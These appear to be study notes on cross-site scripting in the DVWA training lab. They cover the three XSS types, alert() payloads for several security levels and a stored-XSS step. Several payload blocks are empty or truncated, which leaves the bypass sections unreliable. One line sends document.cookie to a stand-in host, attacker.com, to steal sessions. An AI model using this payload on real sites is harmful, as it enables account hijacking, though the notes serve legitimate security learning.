## Cross-Site Scripting (XSS)

### What is it?
User input rendered in page without encoding.
JavaScript executes in victim's browser.

### Three Types
- Reflected = fires once, needs victim to click link
- Stored = saved in database, hits every visitor
- DOM = browser only, server never sees it

### Low Security Payloads
```javascript
alert(1)
alert('moew')
```

### Medium Security Bypass
Script tags blocked. Use event handlers:
```javascript


```

### High Security Bypass
Case variation and nested tags:
```javascript
alert(1)
<script>alert(1)
```

### Real Impact — Cookie Theft
alert(1) is just proof. Real attack steals sessions:
```javascript
document.location='http://attacker.com/?c='+document.cookie
```
Victim loads page → cookie sent to attacker → 
attacker pastes cookie in browser → logged in as victim.
No password needed.

### Stored XSS — DVWA
Go to XSS Stored → message board → inject in message field:
```javascript
alert('stored')
```
Every user who visits the page gets hit automatically.
